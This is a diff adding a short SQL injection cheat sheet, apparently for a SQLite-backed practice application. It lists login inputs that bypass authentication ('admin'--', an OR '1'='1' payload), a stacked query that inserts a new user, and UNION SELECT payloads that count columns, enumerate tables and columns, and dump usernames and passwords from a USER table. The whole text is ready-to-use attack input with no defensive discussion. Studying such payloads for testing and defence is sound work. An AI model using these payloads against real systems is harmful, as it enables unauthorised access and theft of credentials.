@@ -1,0 +1,32 @@
+## Bypass authentication
+
+Login:		admin'--
+Password:	
+
+Login:		admin' OR '1'='1
+Password:	
+
+
+# Insert user (requires basic knowledge of db tables structure)
+
+Login:		
+Password:	'; INSERT INTO USER VALUES("a", "a", 2);--
+
+
+## Dump data
+(in inputs where output is expected)
+
+# Examine the number of columns in the query and displayed columns
+' UNION SELECT 1--
+' UNION SELECT 1, 2--
+' UNION SELECT 1, 2, 3--
+(etc. Error for every wrong number of columns)
+
+# Dump all the table names from the database
+' UNION SELECT name, 2, 3, 4, 5 FROM sqlite_schema  WHERE type = 'table'--
+
+# Dump all column names and their types from the table 'USER'
+' UNION SELECT name, type, 3, 4, 5 FROM pragma_table_info('USER')--
+
+# Dump columns 'USERNAME' and 'PASSWORD' from table 'USER' (it allows to dump any column from the database)
+' UNION SELECT USERNAME, PASSWORD, 3, 4, 5 FROM USER--
